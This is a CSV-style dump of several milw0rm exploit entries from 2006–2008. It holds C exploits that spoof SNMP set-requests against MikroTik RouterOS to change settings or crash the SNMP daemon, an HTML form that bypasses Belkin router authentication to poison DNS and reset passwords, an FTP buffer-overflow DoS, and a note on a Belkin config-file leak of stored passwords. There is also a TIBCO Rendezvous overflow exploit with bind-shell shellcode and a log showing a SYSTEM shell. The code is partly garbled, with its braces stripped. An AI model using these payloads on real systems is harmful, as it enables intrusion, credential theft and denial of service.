2008-09-05,Remote,Hardware,ShadOS,MikroTik RouterOS 3.13,SNMP write (Set request),"/*  --------------------------------------------------------------------------
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <memory.h>
#include <string.h>
/* Snmp Version */
/* Community */
// milw0rm.com [2008-09-05]","*                          (c) ShadOS 2008
*        _  _     _ _ _  __     _      _   _
*      | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___
*      | __ / -_) | | ' <| ' \| / _` | ' \  _(_-<
*      |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/
*            hellknights.void.ru    |___/  .0x48k.
*  --------------------------------------------------------------------------
*  Title: MicroTik RouterOS <=3.13 SNMP write (Set request) PoC exploit.
*  Vendor: www.mikrotik.com
*  Vulnerable versions: 2.9.51 (2.9.x branch), 3.13 (3.x branch)
*  (prior versions also affected).
*  Funded: 03.09.2008 by ShadOS (http://hellknights.void.ru)
*  Let's see the manual:
*  http://www.mikrotik.com/testdocs/ros/2.9/root/snmp_content.php
*  [QUOTE]
*  > SNMP Service
*  >
*  > General Information
*  >
*  > Summary
*  >
*  > ... RouterOS supports only Get, which means that you can use this implementation only for network monitoring.
*  >
*  >
*  > The MikroTik RouterOS supports:
*  >
*  > SNMPv1 only
*  > Read-only access is provided to the NMS (network management system)
*  > User defined communities are supported
*  > Get and GetNext actions
*  > No Set support
*  > No Trap support
*  >
*  [/QUOTE]
*  Don't forget to visit our site and my homepage for new releases:
*  http://hellknights.void.ru
*  http://shados.freeweb7.com
*  Also, you can mail me any bugs or suggestions:
*  mailto: shados /at/ mail /dot/ ru
*  Thanks 2 cih.ms and all my friends.
*  --------------------------------------------------------------------------
*  Copyright (C) 89, 90, 91, 1995-2008 Free Software Foundation.
*  This program is free software; you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation; either version 2, or (at your option)
*  any later version.
*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software Foundation,
*  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
*  --------------------------------------------------------------------------
unsigned char evilcode[49] = {
0x33, 0x02, 0x01, 0x02, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x18, 0x30, 0x16, 0x06, 0x08,
0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x05, 0x00, 0x04, 0x17, 0x57, 0x72, 0x69, 0x74, 0x65, 0x20,
0x69, 0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x73, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x65, 0x64,
0x21
unsigned short in_cksum(addr, len)
u_short *addr;
int len;
register int nleft = len;
register u_short *w = addr;
register int sum = 0;
u_short answer = 0;
while (nleft > 1) {
sum += *w++;
sum += *w++;
nleft -= 2;
if (nleft == 1) {
*(u_char *) (&answer) = *(u_char *) w;
sum += answer;
sum = (sum >> 17) + (sum & 0xffff);
sum += (sum >> 17);
answer = -sum;
return (answer);
int sendudp(int sock,unsigned long *saddr, unsigned long *daddr,unsigned int sport,unsigned int dport,char *data, int len)
char *packet;
struct sockaddr_in dstaddr;
struct iphdr *ip;
struct udphdr *udp;
packet = (char *)malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + len);
memset(packet,0,sizeof(struct iphdr) + sizeof(struct udphdr) + len);
if (packet == NULL) { printf(""Malloc failed\n""); exit(-1); }
ip = (struct iphdr *)packet;
udp = (struct udphdr *)(packet+sizeof(struct iphdr));
ip->saddr = *saddr;
ip->daddr = *daddr;
ip->version = 4;
ip->ihl = 5;
ip->ttl = 255;
ip->id = htons((unsigned short) rand());
ip->protocol = IPPROTO_UDP;
ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)+len);
ip->check = in_cksum(ip, sizeof(struct iphdr));
udp->source = htons(sport);
udp->dest = htons(dport);
udp->len = htons(sizeof(struct udphdr) + len);
memcpy(packet + (sizeof(struct iphdr) + sizeof(struct udphdr)),data,len);
dstaddr.sin_family = AF_INET;
dstaddr.sin_addr.s_addr = *daddr;
if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr)+len,0,(struct sockaddr *)&dstaddr,sizeof(struct sockaddr_in)) < 0)
perror(""sendto() failed"");
free(packet);
char * makereq(char *community,int *size)
char *buf;
char *ptr;
int len;
int i;
len = 7 + strlen(community) + sizeof(evilcode);
buf = (char *)malloc(len);
ptr = buf;
*ptr++ = 0x30;
*ptr++ = len;
*ptr++ = 0x02;
*ptr++ = 0x01;
*ptr++ = 0x00;
*ptr++ = 0x04;
*ptr++ = strlen(community);
strcpy(ptr,community);
ptr = ptr + strlen(community);
*ptr++ = 0xA3; /* Set Request */
memcpy(ptr, evilcode, sizeof(evilcode));
ptr = ptr + sizeof(evilcode);
*size = len+1;
return buf;
int erexit(char *msg)
printf(""%s\n"",msg);
exit (-1) ;
int usage()
printf(""Usage: ./snmpdos <-s source> <-d dest> <-c community>\n"");
int main(int argc, char **argv)
char *saddr,*daddr,*community;
unsigned char *buf;
int size;
int sock;
unsigned long lsaddr,ldaddr;
int i;
saddr = NULL;
daddr = NULL;
if (argc != 7) { usage(); erexit(""not enough args\n""); }
if (!strcmp(argv[1],""-s""))
saddr = strdup(argv[2]);
if (!strcmp(argv[3],""-d""))
daddr = strdup(argv[4]);
if (!strcmp(argv[5],""-c""))
community = strdup(argv[6]);
printf(""Ok, spoofing packets from %s to %s\n"",saddr,daddr);
if (inet_addr(saddr) == -1 || inet_addr(daddr) == -1)
erexit(""Invalid source/destination IP address\n"");
if (saddr == NULL) { usage(); erexit(""No Source Address""); }
if (daddr == NULL) { usage(); erexit(""No Dest Address""); }
sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
if (sock == -1)
erexit(""Couldnt open Raw socket!(Are you root?)\n"");
lsaddr = inet_addr(saddr);
ldaddr = inet_addr(daddr);
buf = makereq(community,&size);
printf(""Sending %d bytes buffer:\n"",size);
for (i=0;i<size;i++)
printf(""0x%02x "",buf[i]);
printf(""\n"");
sendudp(sock,&lsaddr,&ldaddr,32788,161,buf,size);
fprintf(stdout,""Sent packet. \""/system identity\"" must be changed.\n"");
return 0;"
2008-08-25,Remote,Hardware,noensr,Belkin Wireless G Router / ADSL2 Modem,Authentication Bypass,# milw0rm.com [2008-08-25],"<html>
<head>
</head>
<body>
<b>html code to bypass the webinterface password protection of the Belkin wireless G router + adsl2 modem.<br>
It worked on model F5D7632-4V6 with upgraded firmware 6.01.08.</b>
<br>
<form action=""http://192.168.2.1/cgi-bin/setup_dns.exe"" name=dnspoison method=post>
Change dns nameservers (ip's can't be the same)<br>
<input name=page type=hidden value=""setup_dns"">
<input name=logout type=hidden value="""">
<input name=auto_from_isp type=hidden value=""0"">
<input name=dns1_1 type=text value=""1"">
<input name=dns1_2 type=text value=""2"">
<input name=dns1_3 type=text value=""3"">
<input name=dns1_4 type=text value=""4"">
<br>
<input name=dns2_1 type=text value=""1"">
<input name=dns2_2 type=text value=""2"">
<input name=dns2_3 type=text value=""3"">
<input name=dns2_4 type=text value=""5"">
<br>
<input name=submit type=submit value=""poison"">
</form>
<br>
<br>
<form action=""http://192.168.2.1/cgi-bin/statusprocess.exe"" name=clearlog method=post>
Clear log file<br>
<input name=securityclear type=submit value=""clear"">
</form>
<br>
<br>
<form ACTION=""http://192.168.2.1/cgi-bin/system_all.exe"" method=post name=changepassword>
Change time, pwd(if you have old pwd), remote management, UPnP:)<br>
and automatic firmware update (nice combined with DNS poisoning)<br>
<input type=""hidden"" name=""restart_time"" value=""0"">
<input type=""hidden"" name=""reload"" value=""1"">
<input type=""hidden"" name=""restart_page"" value='document.location.href=""system.stm"";'>
<input type=""hidden"" name=""location_page"" value=""system.stm"">
<input type=""hidden"" name=""server1"" value="""">
<input type=""hidden"" name=""server2"" value="""">
<!-- for clock -->
<input type=""hidden"" name=""year"" value="""">
<input type=""hidden"" name=""mon"" value="""">
<input type=""hidden"" name=""day"" value="""">
<input type=""hidden"" name=""hour"" value="""">
<input type=""hidden"" name=""min"" value="""">
<input type=""hidden"" name=""sec"" value="""">
<br>old password<br>
<input type=""password"" size=""12"" maxlength=""12"" name=""userOldPswd"" value="""">
<br>new password, twice<br>
<input type=""password"" size=""12"" maxlength=""12"" name=""userNewPswd"" value="""">
<input type=""password"" size=""12"" maxlength=""12"" name=""userConPswd"" value="""">
<br>login timeout (1-99 minutes)<br>
<input type=""text"" name=""timeout"" size=""3"" maxlength=""3"" value=""10"">
<br>Time and Time Zone:<br>
daylight saving : <br>
<input type=""checkbox"" name=""daylight"" value=""1"">timezone(number)<br>
<input type=""text"" name=""time_zone"" value=""26"">
<input type=""checkbox"" name=""enable_ntp"" value=""1"">Enable Automatic Time Server Maintenance<br>
<tr>
<td width=""240"">Primary Server</td>
<td width=""360"">
<select name=""time1"">
<option>132.163.4.102  - North America</option>
<option>192.5.41.41    - North America</option>
<option>192.5.41.209   - North America</option>
<option>207.200.81.113 - North America</option>
<option>208.184.49.9   - North America</option>
<option>129.132.2.21   - Europe</option>
<option>130.149.17.8   - Europe</option>
<option>128.250.36.3   - Australia</option>
<option>137.189.8.174  - Asia Pacific</option>
</select>
</td>
</tr>
<tr>
<td width=""240"">Secondary Server</td>
<td width=""360"">
<select name=""time2"">
<option>132.163.4.102  - North America</option>
<option>192.5.41.41    - North America</option>
<option>192.5.41.209   - North America</option>
<option>207.200.81.113 - North America</option>
<option>208.184.49.9   - North America</option>
<option>129.132.2.21   - Europe</option>
<option>130.149.17.8   - Europe</option>
<option>128.250.36.3   - Australia</option>
<option>137.189.8.174  - Asia Pacific</option>
</select>
</td>
</tr>
<br>Remote management: <br>
<input type=""checkbox"" name=""allow_all"" value=""1"">Any IP address can remotely manage the router<br>
Only this IP address can remotely manage the router<br>
<input name=""IP1"" size=""3"" maxlength=""3"" value=""0"">.
<input name=""IP2"" size=""3"" maxlength=""3"" value=""0"">.
<input name=""IP3"" size=""3"" maxlength=""3"" value=""0"">.
<input name=""IP4"" size=""3"" maxlength=""3"" value=""0"">
<br>remote port:
<input name=""REMOTEPORT"" size=""5"" maxlength=""5"" value=""0"">
<br>NAT Enabling:<br>
<input type=radio name=Nat_enable value=1>Enable<br>
<input type=radio name=Nat_enable value=0>Disable<br>
<br>UPnP<br>
<input type=""radio"" name=""upnp_enable"" value=1>Enable<br>
<input type=radio name=upnp_enable value=0>Disable<br>
<br>Auto Update Firmware Enabling<br>
<input type=""radio"" name=""autoUpdate_enable"" value=1>Enable<br>
<input type=""radio"" name=""autoUpdate_enable"" value=0>disable<br>
</form>
<form method=""POST"" action=""http://192.168.2.1/cgi-bin/restore.exe"" name=""RebootForm"">
<br>restore factory defaults (and pw:D)<br>
<input type=""hidden"" name=""page"" value=""tools_restore"">
<input type=""hidden"" name=""logout"">
<input type=""submit"" value=""Restore Defaults"" style=""{width:120px;}"" class=""submitBtn"">
</form>
</body>
</html>"
2008-03-01,DoS,Linux,0in,Galaxy FTP Server 1.0 (Neostrada Livebox DSL Router),Denial of Service,"DESCRIPTION:
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
// milw0rm.com [2008-03-01]","Discovered bY 0in From DaRk-CodeRs Programming & Security Group!
Contact: 0in(dot)email[at]gmail(dot)com
HOMEPAGE: http://dark-coders.4rh.eu
Livebox router is vulnerability to remote (but from local network, because firewall working..) buffer overflow DoS attack to FTP service.
POC:
int port=21;
struct hostent *he;
struct sockaddr_in their_addr;
int konekt(char *addr)
int sock;
he=gethostbyname(addr);
if(he==NULL)
printf(""Unknow host!\nexiting..."");
return -1;
if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
perror(""socket"");
return -2;
their_addr.sin_family = AF_INET;
their_addr.sin_port = htons(port);
their_addr.sin_addr = *((struct in_addr *)he->h_addr);
memset(&(their_addr.sin_zero), '\0', 8);
if (connect(sock, (struct sockaddr *)&their_addr,
sizeof(struct sockaddr)) == -1)
perror(""connect"");
return -1;
return sock;
int main(int argc,char *argv[])
printf(""\n+===============================Yeah======================================+"");
printf(""\n+= ADI Convergence Galaxy FTP Server v1.0 (Neostrada Livebox DSL Router) =+"");
printf(""\n+= Remote Buffer Overflow DoS Exploit =+"");
printf(""\n+= bY =+"");
printf(""\n+= Maks M. [0in] From Dark-CodeRs Security & Programming Group! =+"");
printf(""\n+= 0in(dot)email[at]gmail(dot)com =+"");
printf(""\n+= Please visit: http://dark-coders.4rh.eu =+"");
printf(""\n+= Greetings to: Die_Angel, Sun8hclf, M4r1usz, Aristo89, Djlinux =+"");
printf(""\n+= And other friends: MaLy, Slim, elwin013, Rade0n3900, Wojto111, =+"");
printf(""\n+= Chomzee, AfroPL, Joker186 =+"");
printf(""\n+===============================Yeah======================================+"");
if(argc<2)
printf(""\nUse %s [IP]!\n"",argv[0]);
exit(0);
printf(""\nConnecting to:%s..."",argv[1]);
int sock=konekt(argv[1]);
if(sock<0)
printf(""\neh..."");
exit(0);
printf(""\nConnected!!\n"");
char rcv[256];
recv(sock,rcv,255,0);
printf(""\n%s\n"",rcv);
printf(""\nSending evil buffer.."");
char evil[100*100]=""%n\x01\x02\x03\x04"";
int i;
for(i=0;i<(100*100)-100;i++)
strcat(evil,""A"");
strcat(evil,""\r\n"");
send(sock,evil,strlen(evil),0);
strcpy(rcv,"""");
recv(sock,rcv,255,0);
printf(""\n%s\n"",rcv);
char pass[100*1000]=""PASS "";
strcat(pass,evil);
strcat(pass,""\n\r"");
send(sock,pass,strlen(pass),0);
strcpy(rcv,"""");
recv(sock,rcv,255,0);
printf(""\n%s\n"",rcv);
printf(""\nOK!\nYou're Livebox FTP server should fucked out..."");
exit(0);"
2008-02-03,DoS,Hardware,ShadOS,MicroTik RouterOS 3.2,SNMPd snmp-set Denial of Service,"/* --------------------------------------------------------------------------
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <memory.h>
#include <string.h>
/* Snmp Version */
/* Community */
// milw0rm.com [2008-02-03]","*                          (c) ShadOS 2008
*       _  _     _ _ _  __     _      _   _
*      | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___
*      | __ / -_) | | ' <| ' \| / _` | ' \  _(_-<
*      |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/
*        hellknights.void.ru    |___/  .0x48k.
* --------------------------------------------------------------------------
*  MicroTik RouterOS <=3.2 SNMPd snmp-set DoS exploit. Other OSs may be vulnurable (fe. Linux )
*  Don't forget to visit our site and my homepage for new releases:
*  http://hellknights.void.ru
*  http://shados.freeweb7.com
*  Also, you can mail me any bugs or suggestions:
*  mailto: shados /at/ mail /dot/ ru
*  Thanks 2 antichat.ru and all my friends.
* --------------------------------------------------------------------------
*  Copyright (C) 89, 90, 91, 1995-2007 Free Software Foundation.
*  This program is free software; you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation; either version 2, or (at your option)
*  any later version.
*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software Foundation,
*  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
* --------------------------------------------------------------------------
char evilcode[] = {
0x19, 0x02, 0x02, 0x1e, 0x0c, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0d, 0x30, 0x0b, 0x06, 0x07, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x00
unsigned short in_cksum(addr, len)
u_short *addr;
int len;
register int nleft = len;
register u_short *w = addr;
register int sum = 0;
u_short answer = 0;
while (nleft > 1) {
sum += *w++;
sum += *w++;
nleft -= 2;
if (nleft == 1) {
*(u_char *) (&answer) = *(u_char *) w;
sum += answer;
sum = (sum >> 17) + (sum & 0xffff);
sum += (sum >> 17);
answer = -sum;
return (answer);
int sendudp(int sock,unsigned long *saddr, unsigned long *daddr,unsigned int sport,unsigned int dport,char *data, int len)
char *packet;
struct sockaddr_in dstaddr;
struct iphdr *ip;
struct udphdr *udp;
packet = (char *)malloc(sizeof(struct iphdr)+sizeof(struct udphdr)+len);
memset(packet,0,sizeof(struct iphdr) + sizeof(struct udphdr) + len);
if (packet == NULL) { perror(""Malloc failed\n""); exit(-1); }
ip = (struct iphdr *)packet;
udp = (struct udphdr *)(packet+sizeof(struct iphdr));
ip->saddr = *saddr;
ip->daddr = *daddr;
ip->version = 4;
ip->ihl = 5;
ip->ttl = 255;
ip->id = htons((unsigned short) rand());
ip->protocol = IPPROTO_UDP;
ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)+len);
ip->check = in_cksum(ip, sizeof(struct iphdr));
udp->source = htons(sport);
udp->dest = htons(dport);
udp->len = htons(sizeof(struct udphdr) + len);
memcpy(packet+(sizeof(struct iphdr) + sizeof(struct udphdr)),data,len);
dstaddr.sin_family = AF_INET;
dstaddr.sin_addr.s_addr = *daddr;
if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr)+len,0,(struct sockaddr *)&dstaddr,sizeof(struct sockaddr_in)) < 0)
perror(""sendto() failed"");
free(packet);
char * makereq(char *community,int *size)
char *buf;
char *ptr;
int len;
int i;
len = 5 + strlen(community) + sizeof(evilcode);
buf = (char *)malloc(len);
ptr = buf;
*ptr++ = 0x30;
*ptr++ = len;
*ptr++ = 0x02;
*ptr++ = 0x01;
*ptr++ = 0x00;
*ptr++ = 0x04;
*ptr++ = strlen(community);
strcpy(ptr,community);
ptr = ptr + strlen(community);
*ptr++ = 0xa3; /* Set Request */
memcpy(ptr, evilcode, sizeof(evilcode));
ptr = ptr + sizeof(evilcode);
*size = len+2;
return buf;
int erexit(char *msg)
printf(""%s\n"",msg);
exit (-1) ;
int usage()
printf(""Usage: ./snmpdos <-s source> <-d dest> <-c community>\n"");
int main(int argc, char **argv)
char *saddr,*daddr,*community;
unsigned char *buf;
int size;
int sock;
unsigned long lsaddr,ldaddr;
int i;
saddr = NULL;
daddr = NULL;
if (argc != 7) { usage(); erexit(""not enough args\n""); }
if (!strcmp(argv[1],""-s""))
saddr = strdup(argv[2]);
if (!strcmp(argv[3],""-d""))
daddr = strdup(argv[4]);
if (!strcmp(argv[5],""-c""))
community = strdup(argv[6]);
printf(""Ok, spoofing packets from %s to %s\n"",saddr,daddr);
if (inet_addr(saddr) == -1 || inet_addr(daddr) == -1)
erexit(""Invalid source/destination IP address\n"");
if (saddr == NULL) { usage(); erexit(""No Source Address""); }
if (daddr == NULL) { usage(); erexit(""No Dest Address""); }
sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
if (sock == -1)
erexit(""Couldnt open Raw socket!(Are you root?)\n"");
lsaddr = inet_addr(saddr);
ldaddr = inet_addr(daddr);
buf = makereq(community,&size);
sendudp(sock,&lsaddr,&ldaddr,32788,161,buf,size);
fprintf(stdout,""Sent packet. SNMPd must be down.\n"");
return 0;"
2008-01-20,Remote,Hardware,DarkFig,Belkin F5D9230-4 Wireless G Plus MIMO Router,Authentication Bypass,"## VULNERABILITY:
##  Belkin Wireless G Plus MIMO Router F5D9230-4
##  Authentication Bypass Vulnerability
## AUTHOR:
##  DarkFig < gmdarkfig (at) gmail (dot) com >
##  http://acid-root.new.fr/?0:17
##  #acidroot@irc.worldnet.net
## INTRODUCTION:
##  I recently bought this router for my local
##  network (without modem integrated), now I can tell
##  that it was a bad choice. When my ISP disconnects
##  me from internet, in the most case I have to reboot
##  my Modem and the Router in order to reconnect.
##  So I coded a program (which send http packets) to reboot
##  my router, it asks me the router password, and reboots it.
##  One day I wrote a bad password, but it worked. So I
##  decided to make some tests in order to see if there was
##  a vulnerability.
## DESCRIPTION:
##  Apparently when the router starts, it creates a file
##  (without content) named user.conf, then when we go to
##  SaveCfgFile.cgi, the configuration is saved to the file
##  user.conf. But the problem is that we can access to the
##  file SaveCfgFile.cgi without login.
## PROOF OF CONCEPT:
##  For example we can get the configuration file here:
##  http://<ROUTER_IP>/SaveCfgFile.cgi
##  pppoe_username=...
##  pppoe_password=...
##  wl0_pskkey=...
##  wl0_key1=...
##  mradius_password=...
##  mradius_secret=...
##  httpd_password=...
##  http_passwd=...
##  pppoe_passwd=...
##  Tested on the latest firmware for this product
##  (version 3.01.53).
## PATCH:
##  Actually (08-01-19) there is no firmware update, but I
##  contacted the author, if they'll release a patch, it
##  will be available here:
##  http://web.belkin.com/support/download/download.asp
##  ?download=F5D9230-4&lang=1&mode=
# milw0rm.com [2008-01-20]",
2006-09-01,Remote,Windows,Andres Tarasco,TIBCO Rendezvous 7.4.11,add router Remote Buffer Overflow,"/* more versions here.... */
#include <stdio.h>
#include <tchar.h>
#include <winsock2.h>
#include <windows.h>
#include <Wininet.h>
#pragma comment(lib, ""ws2_32.lib"")
#pragma comment(lib, ""wininet.lib"")
/* win32_bind -  EXITFUNC=seh LPORT=51477 Size=346 Encoder=PexFnstenvSub http://metasploit.com */
//Restricted chars: 0x00 0x06 0x07 0x08 0x0a 0x0d 0x20 0x22 0x28 0x29 0x30 0x5c 0xcd 0xf2
//better than playing with sockets ^^
//PSTR pszUser =""Administrator"";
//PSTR pszPass=""test"";
//authentication support here.
//If you need user & password try
//a) bruteforce
//b) sniffer
//c) local privilege scalation with TibcoPasswordExtractor.c
//        printf(""HEADER RESPONSE: %i \n"",resultado->dwReturnCode);
//        printf(""Vamos a leer %i bytes de datos\n"",dwFileSize);
//m/""#242424"">(.*?)<br>.*?(.*?)<br>/
//BLINK! BLINK! BLINK!
// memcpy(&datos[12+498],""AAAA"",4);
//    DumpMem(datos,strlen(datos));
//printf(""resultado: %i\n"",resultado->dwReturnCode);
//printf(""resultado: %i\n"",resultado->dwBytesRead);
//printf(""datos: %s\n"",resultado->buffer);
//DumpMem(resultado->buffer+300,strlen(resultado->buffer)-300);
//printf(""resultado: %i\n"",resultado->dwBytesRead);
//printf(""datos: %s\n"",resultado->buffer);
// milw0rm.com [2006-09-01]","Exploit: TIBCO RendezVous remote buffer overflow exploit for Win32 (public version)
Affected products: Tibco RendezOVous version <=7.4.11 (Multiple Vulnerabilities)
Author: Andres Tarasco Acuña (atarasco @ sia.es )
Advisory: http://www.514.es
Url: http://www.sia.es
Greetings: Iñaki Lopez and SIA TigerTeam
Status: vulnerability fixed ( Vendor notification + fixes)
Timeline:
Discovered: March 23, 2006
Exploit coded: March 24, 2006
Vendor Notified: March 27, 2006
Vendor patch: May 15, 2006 - Tibco Rendezvous version 7.5
Public Disclosure: who knows
Affected daemons:
- TIB/Rendezvous Routing Communications Daemon (add router buffer overflow) (port 7580)
+ POST /add_router HTTP/1.0
+ router_name=AAAA..AAA&type=+Add+Router+
- TIB/Rendezvous Secure Daemon (port 7580)
+ POST /sd_add_network_service HTTP/1.0
+ network=AAAA..AAAA&service=&type=Add
- TIB/Rendezvous Secure Daemon (port 7580)
+ certificate_from_file() lets remote user verify if remote file exists
- TIB/Rendezvous Secure Daemon (port 7580)
+ Authorized Subjects XSS vulnerability
- TIB/Rendezvous Secure Routing Daemon (add router buffer overflow) (port 7580)
+ POST /add_router HTTP/1.0
+ router_name=AAAA..AAA&type=+Add+Router+
- TIB/Rendezvous Agent for Java (TIB/Rendezvous Daemon Connection Buffer overflow) (port 7581)
+ POST /set_main HTTP/1.0
+ edit_listen=7600&edit_service=AAAA..AAAA&edit_network=&edit_daemon=&submit=Submit
- TIB/Rendezvous Initial Value Cache (port 7581)
+ POST /change_services HTTP/1.0
+ Service=&Network=&Daemon=AAA&request_type=Submit
Affected Operating systems:
- AIX 5.1 and up  RS/6000
- FreeBSD 4.2 and up x86
- HP/UX 11.X  HPPA
- HP/UX 11.22 and up IA-64/Itanium
- Linux 2.4 kernel: 2.4.20 and up, glibc2.2.4 and up x86
- Linux 2.4 kernel: 2.4.20 and up, glibc2.3 and up (includes 2.6 kernel)  x86
- Linux 2.4 kernel: 2.4.18 and up, glibc2.3 and up IA-64/Itanium
- OS/390 V2R6+ USS S/390 compatible OEM hardware
- OS/400 V4R3+ AS/400
- Solaris 2.7 and up Sparc
- Solaris 2.7, 8, 9 (32-bit only)  x86
- Solaris 2.10 (32- and 64-bit only)  x86
- Tru64 Unix 5.1b Alpha
- UnixWare 7.1 and up x86
- VMS 7.2 and up
- Alpha
- Windows 2000/XP/2003 Server [MSVC V6.0 and V7.0] x86
Usage:
D:\Programación\tibco>net start rvrd
El servicio de TIB/Rendezvous Routing Communications Daemon está iniciándose.
El servicio de TIB/Rendezvous Routing Communications Daemon se ha iniciado con éxito.
D:\Programación\tibco>whoami
REDBULL\atarasco
D:\Programación\tibco>tibco.exe -e 192.168.0.1
Tibco RendezVous rvrd, rvsrd remote exploit
Author: Andres Tarasco ( atarasco @ sia.es)
Url: http://www.514.es
[+] Connection to Tibco HTTP Daemon..
[+] Daemon Found: rvrd - version: 7.4.11
[+] Connecting to Tibco SSL Service at port 9003
[+] Sending Exploit ( 546 bytes)
[+] Ignoring unknown CA...
[+] Sending Exploit ( 546 bytes)
[+] Exploit succesfully sent. Now telnet to port 51477
D:\Programación\tibco>nc localhost 51477
Microsoft Windows XP [Versión 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\>whoami
whoami
NT AUTHORITY\SYSTEM
C:\>
struct _targets {
char *daemon;
char *name;
char *version;
char *target;
char *header;
char *tail;
} TARGETS[] = { //supported versions
{ ""rvrd"",""Routing Communications Daemon"",""Generic win32"",""/add_router"",""router_name="",""&type=+Add+Router+""},
{ ""rvsrd"",""Routing Communications Daemon"",""Generic win32"",""/add_router"",""router_name="",""&type=+Add+Router+""},
{ ""rvsd"",""Secure Daemon"",""Generic win32"",""/sd_add_network_service"",""network="",""&service=&type=""},
{ ""rva"",""Agent for Java"",""Generic win32"",""/set_main"",""edit_listen=7600&edit_service="",""&edit_network=&edit_daemon=&submit=Submit""},
{ ""rvcache"",""Initial Value Cache"",""Generic win32"",""/change_services"",""Service=&Network=&Daemon="",""&request_type=Submit""},
unsigned char CALLESP[] =""\xed\x1e\x95\x7c"";    //JMP ESP at ntdll.dll
typedef struct _HTTPData {
unsigned char *buffer;
DWORD dwReturnCode;
DWORD dwBytesRead;
unsigned int DataOffset;
} HTTPData, *PHTTPData;
unsigned char jmpBack []= //JMP EBP -500 without nulls
""\x81\xec\xff\xff\xf4\x01""
""\x81\xc4\x0b\xfe\xf4\x01""
""\xff\xe4"";
unsigned char shellcode[] =
""\x33\xc9\x66\x81\xe9\xb0\xff\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73""
""\x13\x90\x90\x47\x87\x83\xeb\xfc\xe2\xf4\x6c\xfa\xac\xca\x78\x69""
""\xb8\x78\x6f\xf0\xcc\xeb\xb4\xb4\xcc\xc2\xac\x1b\x3b\x82\xe8\x91""
""\xa8\x0c\xdf\x88\xcc\xd8\xb0\x91\xac\xce\x1b\xa4\xcc\x86\x7e\xa1""
""\x87\x1e\x3c\x14\x87\xf3\x97\x51\x8d\x8a\x91\x52\xac\x73\xab\xc4""
""\x63\xaf\xe5\x75\xcc\xd8\xb4\x91\xac\xe1\x1b\x9c\x0c\x0c\xcf\x8c""
""\x46\x6c\x93\xbc\xcc\x0e\xfc\xb4\x5b\xe6\x53\xa1\x9c\xe3\x1b\xd3""
""\x77\x0c\xd0\x9c\xcc\xf7\x8c\x3d\xcc\xc7\x98\xce\x2f\x09\xde\x9e""
""\xab\xd7\x6f\x46\x21\xd4\xf6\xf8\x74\xb5\xf8\xe7\x34\xb5\xcf\xc4""
""\xb8\x57\xf8\x5b\xaa\x7b\xab\xc0\xb8\x51\xcf\x19\xa2\xe1\x11\x7d""
""\x4f\x85\xc5\xfa\x45\x78\x40\xf8\x9e\x8e\x65\x3d\x10\x78\x46\xc3""
""\x14\xd4\xc3\xc3\x04\xd4\xd3\xc3\xb8\x57\xf6\xf8\x8e\x92\xf6\xc3""
""\xce\x66\x05\xf8\xe3\x9d\xe0\x57\x10\x78\x46\xfa\x57\xd6\xc5\x6f""
""\x97\xef\x34\x3d\x69\x6e\xc7\x6f\x91\xd4\xc5\x6f\x97\xef\x75\xd9""
""\xc1\xce\xc7\x6f\x91\xd7\xc4\xc4\x12\x78\x40\x03\x2f\x60\xe9\x56""
""\x3e\xd0\x6f\x46\x12\x78\x40\xf6\x2d\xe3\xf6\xf8\x24\xea\x19\x75""
""\x2d\xd7\xc9\xb9\x8b\x0e\x77\xfa\x03\x0e\x72\xa1\x87\x74\x3a\x6e""
""\x05\xaa\x6e\xd2\x6b\x14\x1d\xea\x7f\x2c\x3b\x3b\x2f\xf5\x6e\x23""
""\x51\x78\xe5\xd4\xb8\x51\xcb\xc7\x15\xd6\xc1\xc1\x2d\x86\xc1\xc1""
""\x12\xd6\x6f\x40\x2f\x2a\x49\x95\x89\xd4\x6f\x46\x2d\x78\x6f\xa7""
""\xb8\x57\x1b\xc7\xbb\x04\x54\xf4\xb8\x51\xc2\x6f\x97\xef\x60\x1a""
""\x43\xd8\xc3\x6f\x91\x78\x40\x90\x47\x87"";
PHTTPData MakeHTTPRequest(char *host, DWORD port, char *metod,char *Url,int ssl, char *buffer);
